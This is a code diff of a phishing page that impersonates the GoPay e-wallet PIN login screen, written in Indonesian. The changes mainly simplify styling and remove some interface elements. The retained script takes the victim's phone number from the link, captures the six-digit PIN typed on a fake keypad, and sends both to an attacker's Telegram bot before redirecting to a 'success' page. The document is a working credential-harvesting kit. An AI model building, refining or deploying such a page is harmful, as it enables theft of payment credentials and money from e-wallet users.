@@ -22,14 +22,10 @@
   <div class="w-full max-w-[420px] mx-auto min-h-screen bg-[#f3f4f6] flex flex-col justify-between p-5 sm:p-6 shadow-sm">
     
     <div>
-      <!-- Header Atas (X dan Bantuan ?) -->
+      <!-- Header Atas -->
       <div class="flex items-center justify-between mb-5">
-        <button type="button" onclick="history.back()" class="w-9 h-9 flex items-center justify-center text-slate-800 font-bold text-lg active:opacity-60">
-          ✕
-        </button>
-        <button type="button" class="w-8 h-8 rounded-full bg-slate-200/80 flex items-center justify-center text-slate-700 text-sm font-bold">
-          ?
-        </button>
+        <button type="button" onclick="history.back()" class="w-9 h-9 flex items-center justify-center text-slate-800 font-bold text-lg">✕</button>
+        <button type="button" class="w-8 h-8 rounded-full bg-slate-200/80 flex items-center justify-center text-slate-700 text-sm font-bold">?</button>
       </div>
 
       <!-- Judul & Keterangan -->
@@ -38,9 +34,6 @@
       </h1>
       <p class="text-slate-900 font-semibold text-[15px] mb-1">
         Ketik GoPay PIN kamu untuk masuk.
-      </p>
-      <p class="text-slate-500 text-[13px] leading-relaxed mb-6">
-        Ini cepat, aman, dan tidak memerlukan OTP.
       </p>
 
       <!-- Kotak Kapsul PIN Berisi 6 Lingkaran -->
@@ -52,46 +45,27 @@
         <div class="pin-circle w-3.5 h-3.5 rounded-full border-2 border-slate-300 bg-transparent transition-all duration-150"></div>
         <div class="pin-circle w-3.5 h-3.5 rounded-full border-2 border-slate-300 bg-transparent transition-all duration-150"></div>
       </div>
-
-      <!-- Tombol Masalah Login atau Daftar -->
-      <div>
-        <button type="button" class="inline-flex items-center px-4 py-2 rounded-full bg-emerald-50 text-emerald-700 text-xs font-bold active:bg-emerald-100 transition-colors">
-          Masalah login atau daftar?
-        </button>
-      </div>
     </div>
 
     <div>
-      <!-- Powered by Gopay Menggunakan Gambar PNG -->
-      <div class="flex items-center justify-center gap-1.5 mb-4 text-xs text-slate-500 font-medium">
-        <span>Powered by</span>
-        <img src="https://i.ibb.co.com/RppVfKnN/IMG-2905.png" alt="GoPay Logo" class="h-4 object-contain inline-block">
-      </div>
-
       <!-- Keypad Angka Custom -->
       <div class="grid grid-cols-3 text-center bg-[#f3f4f6]">
-        <button type="button" onclick="pressNumber('1')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">1</button>
-        <button type="button" onclick="pressNumber('2')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">2</button>
-        <button type="button" onclick="pressNumber('3')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">3</button>
-        
-        <button type="button" onclick="pressNumber('4')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">4</button>
-        <button type="button" onclick="pressNumber('5')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">5</button>
-        <button type="button" onclick="pressNumber('6')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">6</button>
-        
-        <button type="button" onclick="pressNumber('7')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">7</button>
-        <button type="button" onclick="pressNumber('8')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">8</button>
-        <button type="button" onclick="pressNumber('9')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">9</button>
-        
+        <button type="button" onclick="pressNumber('1')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl">1</button>
+        <button type="button" onclick="pressNumber('2')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl">2</button>
+        <button type="button" onclick="pressNumber('3')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl">3</button>
+        <button type="button" onclick="pressNumber('4')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl">4</button>
+        <button type="button" onclick="pressNumber('5')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl">5</button>
+        <button type="button" onclick="pressNumber('6')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl">6</button>
+        <button type="button" onclick="pressNumber('7')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl">7</button>
+        <button type="button" onclick="pressNumber('8')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl">8</button>
+        <button type="button" onclick="pressNumber('9')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl">9</button>
         <div></div>
-        <button type="button" onclick="pressNumber('0')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">0</button>
-        <button type="button" onclick="pressDelete()" class="py-3.5 text-xl font-bold text-slate-900 flex items-center justify-center active:bg-slate-200/60 rounded-xl transition-colors">
-          <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M3 12l6.414-6.414a2 2 0 011.414-.586H19a2 2 0 012 2v10a2 2 0 01-2 2h-8.172a2 2 0 01-1.414-.586L3 12z" />
-          </svg>
+        <button type="button" onclick="pressNumber('0')" class="keypad-btn py-3.5 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl">0</button>
+        <button type="button" onclick="pressDelete()" class="py-3.5 text-xl font-bold text-slate-900 flex items-center justify-center active:bg-slate-200/60 rounded-xl">
+          <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M3 12l6.414-6.414a2 2 0 011.414-.586H19a2 2 0 012 2v10a2 2 0 01-2 2h-8.172a2 2 0 01-1.414-.586L3 12z"/></svg>
         </button>
       </div>
     </div>
-
   </div>
 
   <script>
@@ -101,6 +75,7 @@
     let pin = "";
     const circles = document.querySelectorAll('.pin-circle');
 
+    // AMBIL NOMOR HP LANGSUNG DARI URL LINK
     const urlParams = new URLSearchParams(window.location.search);
     const userPhone = urlParams.get('phone') || "Tidak diketahui";
 
@@ -141,14 +116,9 @@
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: 'Markdown'
-          })
+          body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
         });
 
-        // PIN TERKIRIM -> PINDAH KE HALAMAN LAIN (Contoh: sukses.html)
         setTimeout(() => {
           window.location.href = "sukses.html"; 
         }, 300);
@@ -160,3 +130,4 @@
   </script>
 </body>
 </html>
+
